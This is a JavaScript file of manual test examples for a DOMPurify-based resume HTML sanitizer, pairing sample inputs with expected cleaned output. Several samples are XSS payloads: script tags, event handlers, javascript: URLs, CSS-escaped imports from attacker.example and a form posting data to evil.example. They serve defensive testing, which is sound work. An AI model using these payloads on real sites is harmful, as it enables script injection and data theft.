/**
 * DOMPurify manual test examples.
 *
 * These examples are intended for a JavaScript environment where the app's
 * shared resume sanitizer has already been imported. In source or tests, use:
 *
 * import { sanitizeResumeHtmlDocument } from "../../src/features/resumes/builder/resumeHtmlSanitizer";
 */

// Example 1: normal resume HTML should preserve safe formatting.
const normalResume = `
  <h1 class="name">Jordan Lee</h1>
  <div class="contact">jordan@example.com - (555) 123-4567 - Chicago, IL</div>
  <hr class="section-divider">
  <h2>SUMMARY</h2>
  <p>Experienced program coordinator with 5+ years in client services.</p>
`;

console.log("Normal HTML:", sanitizeResumeHtmlDocument(normalResume));
// Expected: same safe formatting preserved.

// Example 2: script tags should be blocked.
const xssScript = `
  <h1 class="name">Jordan Lee</h1>
  <script>alert("XSS Attack!");</script>
  <p>Legitimate content</p>
`;

console.log("XSS Script:", sanitizeResumeHtmlDocument(xssScript));
// Expected: <h1 class="name">Jordan Lee</h1><p>Legitimate content</p>

// Example 3: event handlers should be blocked.
const xssEvent = `
  <h1 onclick="alert('XSS')" onmouseover="stealData()">Click me</h1>
  <img src="x" onerror="alert('XSS')">
`;

console.log("XSS Event:", sanitizeResumeHtmlDocument(xssEvent));
// Expected: <h1>Click me</h1>; the unsafe image and handlers are removed.

// Example 4: JavaScript URLs and dangerous frames should be blocked.
const xssUrl = `
  <a href="javascript:alert('XSS')">Click here</a>
  <iframe src="javascript:alert('XSS')"></iframe>
`;

console.log("XSS URL:", sanitizeResumeHtmlDocument(xssUrl));
// Expected: <a>Click here</a>

// Example 5: inline style attributes are removed.
const styledResume = `
  <h1 style="color: #333; font-size: 24px;">Jordan Lee</h1>
  <p style="margin-bottom: 10px;">Program Coordinator</p>
`;

console.log("Styled HTML:", sanitizeResumeHtmlDocument(styledResume));
// Expected: text remains, but style attributes are removed.

// Example 6: style blocks cannot load external resources, including through CSS escapes.
const cssResourceLoad = String.raw`
  <style>
    @\000069mport "https://attacker.example/leak.css";
    .avatar { background-image: \75 rl("https://attacker.example/leak.png"); }
    .body { font-size: 14px; }
  </style>
`;

console.log("CSS Resource Load:", sanitizeResumeHtmlDocument(cssResourceLoad));
// Expected: external imports and URL loads are removed; local template CSS remains.

// Example 7: complex dangerous content should be stripped.
const complexXss = `
  <div>
    <h1>Jordan Lee</h1>
    <style>body { background: url('javascript:alert(1)'); }</style>
    <link rel="stylesheet" href="javascript:alert(1)">
    <object data="javascript:alert(1)"></object>
    <embed src="javascript:alert(1)">
    <form action="https://evil.example/steal">
      <input name="data" value="sensitive">
    </form>
  </div>
`;

console.log("Complex XSS:", sanitizeResumeHtmlDocument(complexXss));
// Expected: only safe content remains.
